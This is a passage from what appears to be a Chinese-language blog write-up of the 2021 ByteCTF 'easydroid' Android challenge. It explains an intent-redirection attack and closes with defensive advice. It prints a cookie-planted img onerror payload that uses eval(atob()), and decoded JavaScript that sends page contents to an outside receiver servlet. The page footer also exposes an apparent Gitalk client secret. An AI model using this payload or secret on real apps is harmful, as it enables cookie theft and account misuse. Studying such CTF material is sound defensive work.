class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>h10：添加了一个cookie，名字为<code>&quot;sendData&quot;</code>，相应的值是一个<code>&lt;img&gt;</code>标签，<code>src</code>属性是一个不存在的路径，因此<code>&lt;img&gt;</code>标签在装载文档或图像的过程中会发生错误，就会执行<code>onerror</code>事件。使用<code>eval()</code>来执行js代码文本，<code>atob()</code>将文本进行base64解密得到真实的代码。</p>
+<p>其中base64的代码源为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">&quot;http://10.7.89.108/MyTest/ReceiveServlet?&quot;</span></span><br><span class="line"><span class="keyword">new</span> Image().src = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;html&quot;</span>)[<span class="number">0</span>].innerHTML);</span><br></pre></td></tr></table></figure>
+<p>也就是将该页面全部内容作为参数发送到接收方</p>
+</li>
+<li>
+<p>h11~h12：只是简单的通知一下接收方用户打开了该页面（可以去掉</p>
+</li>
+<li>
+<p>h13~h15：使用setTimeout延时40s再跳转。因为含有恶意js代码的cookie的写入需要一定时间</p>
+<p>等待好后会跳转前往 构造好的intent的Uri。之后便会被<code>shouldOverrideUrlLoading()</code>回调函数捕获，并通过<code>startActivity()</code>来启动TestActivity</p>
+</li>
+</ul>
+<h4 id="本地实现-2">本地实现<a class="header-anchor" href="#本地实现-2"> ¶ </a></h4>
+<p>输入命令让FlagReceiver接收到flag并将其存放在cookie中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.easydroid/.FlagReceiver -e flag ByteCTF&#123;testFlag_x_easydroid&#125;</span><br></pre></td></tr></table></figure>
+<p>此时可以看到</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211018171002253.png" alt="image-20211018171002253"></p>
+<p>预设置的flag已经存储在<code>/data/user/0/com.bytectf.easydroid/app_webview/Cookies</code>中</p>
+<p>实现效果图（中间删除了部分重复帧）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pwn3.gif" alt="pwn3"></p>
+<p>可见已经成功获取到了cookie文件。</p>
+<h2 id="最后-2">最后<a class="header-anchor" href="#最后-2"> ¶ </a></h2>
+<p>通过上述两题的例子，可见我们虽然没有相应权限，但都通过导出组件对Intent重定向不完善的校验产生的漏洞，间接访问到了未导出的组件。</p>
+<p>如何防范：</p>
+<ol>
+<li>应严格控制组件的可导出权限，没必要导出的组件添加<code>android:exported=&quot;false&quot;</code>属性</li>
+<li>在进行Intent重定向时，应对Intent进行严格的校验。</li>
+<li>添加代码混淆，提高攻击成本</li>
+</ol>
+<p>个人的一些浅见，文中如有错误，敬请斧正。</p>
+<p>参考资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bytedance.feishu.cn/file/boxcnWibqpknk3S708qerqHoxiP">Docs (feishu.cn)</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Forgo7ten</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://forgo7ten.github.io/Reverse/2021/Analysis_of_intent_redirection_derived_from_2021bytectf/">https://forgo7ten.github.io/Reverse/2021/Analysis_of_intent_redirection_derived_from_2021bytectf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Forgo7ten.github.io" target="_blank">Forgo7ten'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Android%E6%BC%8F%E6%B4%9E/">Android漏洞</a></div><div class="post_share"><div class="social-share" data-image="http://forgo7ten.gitee.io/store/imgs/15.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.png" target="_blank"><img class="post-qr-code-img" src="/images/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/AndroidReverse/2021/Analysis_of_WeChat/"><img class="prev-cover" src="http://forgo7ten.gitee.io/store/imgs/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vx逆向分析随笔</div></div></a></div><div class="next-post pull-right"><a href="/Reverse/2021/010Editor_registration_process_analysis/"><img class="next-cover" src="http://forgo7ten.gitee.io/store/imgs/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">010Editor注册license算法分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%B12021ByteCTF%E5%BC%95%E5%87%BA%E7%9A%84intent%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%85%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">由2021ByteCTF引出的intent重定向浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intent%E6%B5%85%E8%A6%81%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Intent浅要概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydroid"><span class="toc-number">1.2.</span> <span class="toc-text">babydroid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6server-py"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">服务源码文件server.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apk%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">apk分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#AndroidManifest-xml"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">AndroidManifest.xml</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MainActivity"><span class="toc-number">1.2.1.2.2.</span> <span class="toc-text">MainActivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Vulnerable-%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84"><span class="toc-number">1.2.1.2.3.</span> <span class="toc-text">Vulnerable(易受攻击的)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FlagReceiver"><span class="toc-number">1.2.1.2.4.</span> <span class="toc-text">FlagReceiver</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FileProvider"><span class="toc-number">1.2.1.2.5.</span> <span class="toc-text">FileProvider</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FlagURI"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">FlagURI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">获得权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">Attack代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AttackAPP"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">AttackAPP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">本地实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easydroid"><span class="toc-number">1.3.</span> <span class="toc-text">easydroid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6server-py-2"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">服务源码文件server.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apk%E5%88%86%E6%9E%90-2"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">apk分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#AndroidManifest"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">AndroidManifest</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FlagReceiver-2"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">FlagReceiver</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MainActivity-2"><span class="toc-number">1.3.1.2.3.</span> <span class="toc-text">MainActivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TestActivity"><span class="toc-number">1.3.1.2.4.</span> <span class="toc-text">TestActivity</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intent%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Intent重定向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebView%E7%AA%83%E5%8F%96Cookies"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">WebView窃取Cookies</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">Attack代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AttackAPP-2"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">AttackAPP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#evil-page"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">evil_page</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AE%9E%E7%8E%B0-2"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">本地实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E-2"><span class="toc-number">1.4.</span> <span class="toc-text">最后</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('http://forgo7ten.gitee.io/store/imgs/15.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Forgo7ten</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://Forgo7ten.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function addGitalkSource () {
+  const ele = document.createElement('link')
+  ele.rel = 'stylesheet'
+  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
+  document.getElementsByTagName('head')[0].appendChild(ele)
+}
+
+function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '9e01c692fcf5a9e47867',
+      clientSecret: '6d5297eda0643a171a9e5510f5ea1c29ad851389',
+      repo: 'Forgo7ten.github.io',
+      owner: 'Forgo7ten',
+      admin: ['Forgo7ten'],
+      id: '3546e661c1e6f4f52c29acdc019966cf',
+      updateCountCallback: commentCount
+    },{"language":"en","perPage":20,"distractionFreeMode":true,"pagerDirection":"last","createIssueManually":true}))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    addGitalkSource()
+    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="ヾ(≧▽≦*)o 点个收藏叭,(*^▽^*),w(ﾟДﾟ)w,ㄟ(≧◇≦)ㄏ,(/≧▽≦)/点个关注叭,Σ(っ °Д °;)っ,(●ˇ∀ˇ●),( •̀ ω •́ )✧,(*/ω＼*),ヽ(*。&gt;Д&lt;)o゜真的不收藏一下嘛,(～o￣3￣)～,ヽ（≧□≦）ノ" data-fontsize="15px" data-random="false" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body></html>
